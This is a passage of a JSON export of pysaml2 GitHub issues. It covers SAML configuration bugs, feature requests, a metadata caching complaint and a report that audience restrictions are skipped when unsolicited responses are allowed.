https://<IP_address>\r\nOn the SP configuration i have made the ACS as https://<IP_address>**/** \r\nThe SP ACS has a trailing slash at the end. It fails saying \"require signature\", but when i removed the slash, it worked.\r\n\r\nCan someone help me why it fails because \r\n\r\n> https://<IP_address>\r\n\r\n and\r\n\r\n>  https://<IP_address>/\r\n\r\n is one and the same.  ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/609", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/609/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/609/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/609/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/609", "id": 437274561, "node_id": "MDU6SXNzdWU0MzcyNzQ1NjE=", "number": 609, "title": "Why are audience restrictions not checked by SP for unsolicited requests?", "user": {"login": "morty", "id": 3272, "node_id": "MDQ6VXNlcjMyNzI=", "avatar_url": "https://avatars3.githubusercontent.com/u/3272?v=4", "gravatar_id": "", "url": "https://api.github.com/users/morty", "html_url": "https://github.com/morty", "followers_url": "https://api.github.com/users/morty/followers", "following_url": "https://api.github.com/users/morty/following{/other_user}", "gists_url": "https://api.github.com/users/morty/gists{/gist_id}", "starred_url": "https://api.github.com/users/morty/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/morty/subscriptions", "organizations_url": "https://api.github.com/users/morty/orgs", "repos_url": "https://api.github.com/users/morty/repos", "events_url": "https://api.github.com/users/morty/events{/privacy}", "received_events_url": "https://api.github.com/users/morty/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-04-25T15:53:02Z", "updated_at": "2019-08-24T16:54:13Z", "closed_at": "2019-08-24T16:54:13Z", "author_association": "NONE", "active_lock_reason": null, "body": "## Code Version\r\n\r\npysaml2==4.5.0\r\n\r\n## Expected Behavior\r\n\r\nWe have multiple hosting environments for our website (which acts as an SP) that use different configurations in the IDP which have different entityids. When the SAML comes back it has the entityid in the `AudienceRestriction` section. To prevent SAML from one configuration being used against an environment with a different configuration the SP should check that the entityid matches. This should be done for both solicited and unsolicited.\r\n\r\n## Current Behavior\r\n\r\nThe code currently checks that unsolicited responses are not allowed before doing the audience restriction check.\r\n\r\nhttps://github.com/IdentityPython/pysaml2/blob/master/src/saml2/response.py#L614\r\n\r\nThis means that if `allow_unsolicited` is set to `True` then for all SAML, solicited or not, the audience restriction check will not be done. Therefore request from a different profile with a different entityid can be replayed to gain acccess.\r\n\r\n## Possible Solution\r\n\r\nRemove the line where it checks if that unsolicited requests are not allowed before proceeding with the audience restriction check. \r\n\r\nhttps://github.com/IdentityPython/pysaml2/blob/master/src/saml2/response.py#L614", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/600", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/600/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/600/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/600/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/600", "id": 428810135, "node_id": "MDU6SXNzdWU0Mjg4MTAxMzU=", "number": 600, "title": "Feature Request: For IDP, use a custom template for HTTP form post", "user": {"login": "lindycoder", "id": 12926519, "node_id": "MDQ6VXNlcjEyOTI2NTE5", "avatar_url": "https://avatars2.githubusercontent.com/u/12926519?v=4", "gravatar_id": "", "url": "https://api.github.com/users/lindycoder", "html_url": "https://github.com/lindycoder", "followers_url": "https://api.github.com/users/lindycoder/followers", "following_url": "https://api.github.com/users/lindycoder/following{/other_user}", "gists_url": "https://api.github.com/users/lindycoder/gists{/gist_id}", "starred_url": "https://api.github.com/users/lindycoder/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/lindycoder/subscriptions", "organizations_url": "https://api.github.com/users/lindycoder/orgs", "repos_url": "https://api.github.com/users/lindycoder/repos", "events_url": "https://api.github.com/users/lindycoder/events{/privacy}", "received_events_url": "https://api.github.com/users/lindycoder/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-04-03T14:45:23Z", "updated_at": "2019-04-03T18:13:39Z", "closed_at": "2019-04-03T18:13:39Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi, thank you for your tool!\r\n\r\nWhen server's `apply_bindings()` handles an `BINDING_HTTP_POST` it ultimately uses `https://github.com/IdentityPython/pysaml2/blob/master/src/saml2/pack.py#L43` as a template for the form.\r\n\r\nWould be great to personalize this page for users to see something while they wait.\r\n> Why do they wait, it's an auto post! you say?\r\n\r\nWell if the place where you post takes some time do to stuff, the users sits on a white page loading.  Also if javascript is deactivated, the look is very basic.\r\n\r\n## Code Version\r\npysaml2==4.6.5 (irrelevant i think)\r\n\r\n## Expected Behavior\r\nHave a way to customize the template\r\n\r\n## Current Behavior\r\nNeeds to monkey patch the code or use alternate path for HTTP_POST\r\n\r\n## Possible Solution\r\nAn optional template, in the .format() form, fed into the IDP config\r\n\r\n## Steps to Reproduce\r\nN/A", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/596", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/596/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/596/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/596/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/596", "id": 423370988, "node_id": "MDU6SXNzdWU0MjMzNzA5ODg=", "number": 596, "title": "[Documentation proposal] Running test and code linting", "user": {"login": "peppelinux", "id": 1297620, "node_id": "MDQ6VXNlcjEyOTc2MjA=", "avatar_url": "https://avatars1.githubusercontent.com/u/1297620?v=4", "gravatar_id": "", "url": "https://api.github.com/users/peppelinux", "html_url": "https://github.com/peppelinux", "followers_url": "https://api.github.com/users/peppelinux/followers", "following_url": "https://api.github.com/users/peppelinux/following{/other_user}", "gists_url": "https://api.github.com/users/peppelinux/gists{/gist_id}", "starred_url": "https://api.github.com/users/peppelinux/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/peppelinux/subscriptions", "organizations_url": "https://api.github.com/users/peppelinux/orgs", "repos_url": "https://api.github.com/users/peppelinux/repos", "events_url": "https://api.github.com/users/peppelinux/events{/privacy}", "received_events_url": "https://api.github.com/users/peppelinux/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-03-20T17:07:46Z", "updated_at": "2019-03-20T22:26:56Z", "closed_at": "2019-03-20T17:22:10Z", "author_association": "MEMBER", "active_lock_reason": null, "body": "I executed the tests in the current master branch.\r\nI propose to add a requirements file because I had to install the following dependencies to get test running:\r\n\r\n````\r\npip install pymongo mock responses\r\n````\r\nI also have to report my result:\r\n`6 failed, 666 passed, 3 skipped, 744 warnings in 50.99 seconds`\r\n\r\nAbout the code linting with flake8, I got 4163 alerts. I also didn't find any flake init file.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/591", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/591/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/591/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/591/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/591", "id": 407643494, "node_id": "MDU6SXNzdWU0MDc2NDM0OTQ=", "number": 591, "title": "Installing without Paste?", "user": {"login": "rnd0101", "id": 37494, "node_id": "MDQ6VXNlcjM3NDk0", "avatar_url": "https://avatars1.githubusercontent.com/u/37494?v=4", "gravatar_id": "", "url": "https://api.github.com/users/rnd0101", "html_url": "https://github.com/rnd0101", "followers_url": "https://api.github.com/users/rnd0101/followers", "following_url": "https://api.github.com/users/rnd0101/following{/other_user}", "gists_url": "https://api.github.com/users/rnd0101/gists{/gist_id}", "starred_url": "https://api.github.com/users/rnd0101/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/rnd0101/subscriptions", "organizations_url": "https://api.github.com/users/rnd0101/orgs", "repos_url": "https://api.github.com/users/rnd0101/repos", "events_url": "https://api.github.com/users/rnd0101/events{/privacy}", "received_events_url": "https://api.github.com/users/rnd0101/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-02-07T10:59:44Z", "updated_at": "2019-02-08T00:26:04Z", "closed_at": "2019-02-08T00:23:02Z", "author_association": "NONE", "active_lock_reason": null, "body": "## Code Version\r\n\r\n~latest release~ `4.0.3`\r\n\r\n## Expected Behavior\r\n\r\nWhen installing pysaml2 I expect only core dependencies to be installed.\r\nI do not believe `Paste` is needed for many (most?) cases of pysaml2, maybe I am wrong?\r\n\r\n## Current Behavior\r\n\r\n`Paste`, `repoze.who`, etc (from `require_extras`) are installed.\r\n\r\n## Possible Solution\r\n\r\nNot quite sure; can't find a way to avoid installing some extras.\r\n\r\n## Steps to Reproduce\r\n\r\n1. create new virtualenv\r\n2. `pip install pysaml2==4.0.3`\r\n3. `pip freeze`\r\n4. Extras are there (eg `Paste`)", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/589", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/589/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/589/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/589/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/589", "id": 406696254, "node_id": "MDU6SXNzdWU0MDY2OTYyNTQ=", "number": 589, "title": "NameIDFormat AllowCreate default should be true", "user": {"login": "mrvanes", "id": 1901782, "node_id": "MDQ6VXNlcjE5MDE3ODI=", "avatar_url": "https://avatars0.githubusercontent.com/u/1901782?v=4", "gravatar_id": "", "url": "https://api.github.com/users/mrvanes", "html_url": "https://github.com/mrvanes", "followers_url": "https://api.github.com/users/mrvanes/followers", "following_url": "https://api.github.com/users/mrvanes/following{/other_user}", "gists_url": "https://api.github.com/users/mrvanes/gists{/gist_id}", "starred_url": "https://api.github.com/users/mrvanes/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/mrvanes/subscriptions", "organizations_url": "https://api.github.com/users/mrvanes/orgs", "repos_url": "https://api.github.com/users/mrvanes/repos", "events_url": "https://api.github.com/users/mrvanes/events{/privacy}", "received_events_url": "https://api.github.com/users/mrvanes/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-02-05T09:35:48Z", "updated_at": "2019-02-05T17:10:45Z", "closed_at": "2019-02-05T17:05:09Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "We can configure AllowCreate NameIDFormat but, it turns out, the unconfigured default is false. This is against the SAML2int specs as can be read here: https://saml2int.org/profile/current/\r\n```\r\nThe <saml2p:AuthnRequest> message SHOULD contain a <saml2p:NameIDPolicy>\r\nelement with an AllowCreate attribute of \"true\". \r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/586", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/586/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/586/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/586/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/586", "id": 401794021, "node_id": "MDU6SXNzdWU0MDE3OTQwMjE=", "number": 586, "title": "Please don't cache MDQ responses", "user": {"login": "baszoetekouw", "id": 1461740, "node_id": "MDQ6VXNlcjE0NjE3NDA=", "avatar_url": "https://avatars1.githubusercontent.com/u/1461740?v=4", "gravatar_id": "", "url": "https://api.github.com/users/baszoetekouw", "html_url": "https://github.com/baszoetekouw", "followers_url": "https://api.github.com/users/baszoetekouw/followers", "following_url": "https://api.github.com/users/baszoetekouw/following{/other_user}", "gists_url": "https://api.github.com/users/baszoetekouw/gists{/gist_id}", "starred_url": "https://api.github.com/users/baszoetekouw/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/baszoetekouw/subscriptions", "organizations_url": "https://api.github.com/users/baszoetekouw/orgs", "repos_url": "https://api.github.com/users/baszoetekouw/repos", "events_url": "https://api.github.com/users/baszoetekouw/events{/privacy}", "received_events_url": "https://api.github.com/users/baszoetekouw/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-01-22T14:36:57Z", "updated_at": "2020-01-27T09:17:32Z", "closed_at": "2020-01-27T09:17:31Z", "author_association": "NONE", "active_lock_reason": null, "body": "I am using pyFF as an metadata server for SATOSA, i.e. my SATOSAbackend is configured like this:\r\n```yml\r\n---\r\nmodule: satosa.backends.saml2.SAMLBackend\r\nname: SamlSP\r\nconfig:\r\n  sp_config:\r\n    metadata:\r\n      mdq: ['http://pyff_host:8081']\r\n```\r\n\r\nNow, if metadata is updated in pyFF (specifically, if the SSOLocation or key information of an existing entity changes, but its entityid remains identical), these changes will never be picked up by SATOSA, because deep in pySAML, the MDQ result is cached and is _NEVER_ refreshed.\r\n\r\n## Code Version\r\nmaster\r\n\r\n## Expected Behavior\r\nIf SAML metadata in an MDQ resource changes, this should be picked up by pySAML (and the application in question).\r\n\r\n## Current Behavior\r\nMetadata, once cached, is never updated.\r\n\r\n## Possible Solution\r\nI would prefer pySAML to not cache anything that is requested from an MDQ server (at least not by default).  However, I can understand that this could be a performance issue, as parsing metadata on each request can be painful.  However, at the very least, `MetaDataMDX.__getitem()` should check the age of the cached metadata and invalidate the entry when it expires (or after a configurable, fixed amount of time).\r\n\r\n## Steps to Reproduce\r\nSee above.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/584", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/584/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/584/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/584/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/584", "id": 400477028, "node_id": "MDU6SXNzdWU0MDA0NzcwMjg=", "number": 584, "title": "Azure AD sends SAMLResponse without NameFormat property", "user": {"login": "dbasilio", "id": 8311284, "node_id": "MDQ6VXNlcjgzMTEyODQ=", "avatar_url": "https://avatars0.githubusercontent.com/u/8311284?v=4", "gravatar_id": "", "url": "https://api.github.com/users/dbasilio", "html_url": "https://github.com/dbasilio", "followers_url": "https://api.github.com/users/dbasilio/followers", "following_url": "https://api.github.com/users/dbasilio/following{/other_user}", "gists_url": "https://api.github.com/users/dbasilio/gists{/gist_id}", "starred_url": "https://api.github.com/users/dbasilio/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/dbasilio/subscriptions", "organizations_url": "https://api.github.com/users/dbasilio/orgs", "repos_url": "https://api.github.com/users/dbasilio/repos", "events_url": "https://api.github.com/users/dbasilio/events{/privacy}", "received_events_url": "https://api.github.com/users/dbasilio/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2019-01-17T21:46:51Z", "updated_at": "2019-02-06T10:56:54Z", "closed_at": "2019-02-06T10:56:54Z", "author_association": "NONE", "active_lock_reason": null, "body": "One of our clients is implementing Azure AD as their IDP and our integration started failing. Azure AD does not send the NameFormat property, and they seem to have no intention of adding this ability, as seen [here](https://social.msdn.microsoft.com/Forums/en-US/9fafe20e-53c2-4b5b-8879-7170b0c2c186/provide-the-ability-to-define-nameformat-for-attributes-in-saml-assertions?forum=WindowsAzureAD).\r\n\r\nWithout NameFormat, pysaml2 defaults to `urn:oasis:names:tc:SAML:2.0:attrname-format:unspecified` which might be fine, but for our use case does not work. Looking at how IBM manages [Attribute Mapping](https://www.ibm.com/support/knowledgecenter/en/SSCT62/com.ibm.iamservice.doc/tasks/t_attributes_mapping.html), they default to basic instead of to unspecified.\r\n\r\nIn pysaml2, the unspecified attribute maps are all for ADFS, and seems to be very limited whereas the basic attribute map has a ton of properties.\r\n\r\n## Code Version\r\nWe run 2.0.0 and 4.6.3 depending on the client, but I confirmed this issue still exists in 4.6.5.\r\n\r\n## Possible Solution\r\nI think the default 'should' be basic, but if that's too big a risk to take on, I think allowing consumers to define their own default attribute mapping is a good idea. This way consumers that never use unspecified attribute mapping can default to basic instead.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/582", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/582/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/582/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/582/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/582", "id": 397220403, "node_id": "MDU6SXNzdWUzOTcyMjA0MDM=", "number": 582, "title": "make_metadata.py crashes with 'list object is not an iterator'", "user": {"login": "kevingolding2001", "id": 3046897, "node_id": "MDQ6VXNlcjMwNDY4OTc=", "avatar_url": "https://avatars2.githubusercontent.com/u/3046897?v=4", "gravatar_id": "", "url": "https://api.github.com/users/kevingolding2001", "html_url": "https://github.com/kevingolding2001", "followers_url": "https://api.github.com/users/kevingolding2001/followers", "following_url": "https://api.github.com/users/kevingolding2001/following{/other_user}", "gists_url": "https://api.github.com/users/kevingolding2001/gists{/gist_id}", "starred_url": "https://api.github.com/users/kevingolding2001/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/kevingolding2001/subscriptions", "organizations_url": "https://api.github.com/users/kevingolding2001/orgs", "repos_url": "https://api.github.com/users/kevingolding2001/repos", "events_url": "https://api.github.com/users/kevingolding2001/events{/privacy}", "received_events_url": "https://api.github.com/users/kevingolding2001/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 5605569, "node_id": "MDU6TGFiZWw1NjA1NTY5", "url": "https://api.github.com/repos/IdentityPython/pysaml2/labels/invalid", "name": "invalid", "color": "e6e6e6", "default": true, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-01-09T05:44:48Z", "updated_at": "2019-01-16T02:28:56Z", "closed_at": "2019-01-16T02:28:56Z", "author_association": "NONE", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\nI'm following the docs for configuring the extremely simple service provider.\r\n\r\nWhen I run this command `make_metadata.py sp_conf.py > sp.xml` it crashes with this error:\r\n\r\n```\r\n(pysaml) kgolding@kezubuntu1604:~/pysaml/pysaml2/example/sp-wsgi$ make_metadata.py sp_conf.py > sp.xml\r\nTraceback (most recent call last):\r\n  File \"/home/kgolding/pysaml/bin/make_metadata.py\", line 4, in <module>\r\n    __import__('pkg_resources').run_script('pysaml2==4.6.5', 'make_metadata.py')\r\n  File \"/home/kgolding/pysaml/local/lib/python2.7/site-packages/pkg_resources/__init__.py\", line 664, in run_script\r\n    self.require(requires)[0].run_script(script_name, ns)\r\n  File \"/home/kgolding/pysaml/local/lib/python2.7/site-packages/pkg_resources/__init__.py\", line 1444, in run_script\r\n    exec(code, namespace, namespace)\r\n  File \"/home/kgolding/pysaml/lib/python2.7/site-packages/pysaml2-4.6.5-py2.7.egg/EGG-INFO/scripts/make_metadata.py\", line 59, in <module>\r\n    eds.append(entity_descriptor(cnf))\r\n  File \"/home/kgolding/pysaml/local/lib/python2.7/site-packages/pysaml2-4.6.5-py2.7.egg/saml2/metadata.py\", line 725, in entity_descriptor\r\n    _add_attr_to_entity_attributes(entd.extensions, attr)\r\n  File \"/home/kgolding/pysaml/local/lib/python2.7/site-packages/pysaml2-4.6.5-py2.7.egg/saml2/metadata.py\", line 674, in _add_attr_to_entity_attributes\r\n    extensions.extension_elements\r\nTypeError: list object is not an iterator\r\n```\r\n\r\n## Code Version\r\n<!-- What version and/or branch of the code are you running? -->\r\nThe version on GitHub as of Jan 9 2019.\r\n\r\n## Expected Behavior\r\n<!--- Tell us what should happen -->\r\nAccording to the docs it should output some kind of xml file.\r\n\r\n## Current Behavior\r\n<!--- Tell us what happens instead of the expected behavior -->\r\nCrashes with error shown above.\r\n\r\n## Possible Solution\r\n<!--- Not obligatory, but suggest a fix/reason for the bug, -->\r\n\r\n## Steps to Reproduce\r\n```bash\r\nvirtualenv pysaml\r\ncd pysaml\r\n. bin/activate\r\npip install pytest pymongo responses\r\ngit clone https://github.com/IdentityPython/pysaml2.git\r\ncd pysaml2\r\npython setup.py install\r\ncd tests\r\npy.test\r\ncd ../example/sp-wsgi\r\ncp sp_conf.py.example sp_conf.py\r\ncp service_conf.py.example service_conf.py\r\nmake_metadata.py sp_conf.py > sp.xml\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/578", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/578/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/578/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/578/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/578", "id": 392703350, "node_id": "MDU6SXNzdWUzOTI3MDMzNTA=", "number": 578, "title": "Don't hide xmlsec1 execution errors", "user": {"login": "pjsg", "id": 1508813, "node_id": "MDQ6VXNlcjE1MDg4MTM=", "avatar_url": "https://avatars0.githubusercontent.com/u/1508813?v=4", "gravatar_id": "", "url": "https://api.github.com/users/pjsg", "html_url": "https://github.com/pjsg", "followers_url": "https://api.github.com/users/pjsg/followers", "following_url": "https://api.github.com/users/pjsg/following{/other_user}", "gists_url": "https://api.github.com/users/pjsg/gists{/gist_id}", "starred_url": "https://api.github.com/users/pjsg/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/pjsg/subscriptions", "organizations_url": "https://api.github.com/users/pjsg/orgs", "repos_url": "https://api.github.com/users/pjsg/repos", "events_url": "https://api.github.com/users/pjsg/events{/privacy}", "received_events_url": "https://api.github.com/users/pjsg/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2018-12-19T17:24:40Z", "updated_at": "2019-01-14T19:20:36Z", "closed_at": "2019-01-14T19:20:36Z", "author_association": "NONE", "active_lock_reason": null, "body": "The function _run_xmlsec runs the xmlsec1 binary to perform various operations. The code in that function does not verify that xmlsec1 completed correctly. In particular, it only raises an exception if the xmlsec1 was killed by a unix signal.\r\n\r\n## Code Version\r\nCurrent master\r\n\r\n## Expected Behavior\r\nI think that it ought to raise an exception. There is some confusion about what class should be used. The current implementation is hardwired to raise XmlsecError, but the _run_xmlsec documentation says that it should raise the exception passed as an argument. \r\n\r\n## Current Behavior\r\nThe _run_xmlsec function just returns normally (typically with a null output contents)\r\n\r\n## Possible Solution\r\nChange the line \r\n\r\nif pof.returncode is not None and pof.returncode < 0:\r\n\r\nto\r\n\r\nif pof.returncode is not None and pof.returncode != 0:\r\n\r\n## Notes\r\nThis is very similar to issue #74 which was opened in 2014 and then closed after https://github.com/IdentityPython/pysaml2/commit/6787ce4dd58a5ce41141e389d9dd08ded39e2c4f -- which is the code that only checks for unix signals rather than failures.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/575", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/575/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/575/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/575/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/575", "id": 387098714, "node_id": "MDU6SXNzdWUzODcwOTg3MTQ=", "number": 575, "title": "AttributeError: 'Saml2Client' object has no attribute 'want_assertions_or_response_signed", "user": {"login": "jerryz1982", "id": 1919098, "node_id": "MDQ6VXNlcjE5MTkwOTg=", "avatar_url": "https://avatars0.githubusercontent.com/u/1919098?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jerryz1982", "html_url": "https://github.com/jerryz1982", "followers_url": "https://api.github.com/users/jerryz1982/followers", "following_url": "https://api.github.com/users/jerryz1982/following{/other_user}", "gists_url": "https://api.github.com/users/jerryz1982/gists{/gist_id}", "starred_url": "https://api.github.com/users/jerryz1982/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jerryz1982/subscriptions", "organizations_url": "https://api.github.com/users/jerryz1982/orgs", "repos_url": "https://api.github.com/users/jerryz1982/repos", "events_url": "https://api.github.com/users/jerryz1982/events{/privacy}", "received_events_url": "https://api.github.com/users/jerryz1982/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2018-12-04T03:02:27Z", "updated_at": "2018-12-04T03:39:30Z", "closed_at": "2018-12-04T03:39:30Z", "author_association": "NONE", "active_lock_reason": null, "body": "parse_authn_request_response of saml2client returns exception after upgrading to 4.6.4\r\n\r\n## Code Version\r\n4.6.4\r\n\r\n## Expected Behavior\r\nparse_authn_request_response returns no exception\r\n\r\n## Current Behavior\r\nAttributeError: 'Saml2Client' object has no attribute 'want_assertions_or_response_signed\r\n\r\n## Possible Solution\r\ngive want_assertions_or_response_signed default value when it is not set in config.\r\n\r\n## Steps to Reproduce\r\n1. upgrade to 4.6.4\r\n2. create client instance without want_assertions_or_response_signed being set\r\n3. saml_client.parse_authn_request_response(\r\n                flask.request.form['SAMLResponse'],\r\n                saml2.entity.BINDING_HTTP_POST,\r\n            )\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/572", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/572/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/572/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/572/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/572", "id": 384805638, "node_id": "MDU6SXNzdWUzODQ4MDU2Mzg=", "number": 572, "title": "Using Pysaml2 with Fargate", "user": {"login": "JohnnyP10", "id": 723409, "node_id": "MDQ6VXNlcjcyMzQwOQ==", "avatar_url": "https://avatars1.githubusercontent.com/u/723409?v=4", "gravatar_id": "", "url": "https://api.github.com/users/JohnnyP10", "html_url": "https://github.com/JohnnyP10", "followers_url": "https://api.github.com/users/JohnnyP10/followers", "following_url": "https://api.github.com/users/JohnnyP10/following{/other_user}", "gists_url": "https://api.github.com/users/JohnnyP10/gists{/gist_id}", "starred_url": "https://api.github.com/users/JohnnyP10/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/JohnnyP10/subscriptions", "organizations_url": "https://api.github.com/users/JohnnyP10/orgs", "repos_url": "https://api.github.com/users/JohnnyP10/repos", "events_url": "https://api.github.com/users/JohnnyP10/events{/privacy}", "received_events_url": "https://api.github.com/users/JohnnyP10/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2018-11-27T13:54:43Z", "updated_at": "2019-01-16T18:37:08Z", "closed_at": "2019-01-16T18:37:08Z", "author_association": "NONE", "active_lock_reason": null, "body": "<!--- Provide a general summary of the issue in the Title above -->\r\nIt seems when running pysaml2 in a Fargate Container the outstanding_queries are never populate which results in an Unsolicited Response.  The only solution i have found is to add the following to the SP config 'allow_unsolicited': True\r\n## Code Version\r\n<!-- What version and/or branch of the code are you running? -->\r\nthe latest as of 2018_11_27 which is 4.6.4\r\n## Expected Behavior\r\n<!--- Tell us what should happen -->\r\nIt should retain the outstanding queries\r\n## Current Behavior\r\n<!--- Tell us what happens instead of the expected behavior -->\r\nthe struct is empty\r\n## Possible Solution\r\n<!--- Not obligatory, but suggest a fix/reason for the bug, -->\r\nI saw mention of State in the client.py but nothing on how to use it.  Maybe this would be a solution?\r\n## Steps to Reproduce\r\n<!--- Provide a link to a live example, or an unambiguous set of steps to -->\r\n<!--- reproduce this bug. Include code to reproduce, if relevant -->\r\n1. Configure a python app with default values and try running it in fargate.\r\n2.\r\n3.\r\n4.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/571", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/571/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/571/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/571/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/571", "id": 384310152, "node_id": "MDU6SXNzdWUzODQzMTAxNTI=", "number": 571, "title": "No exception for 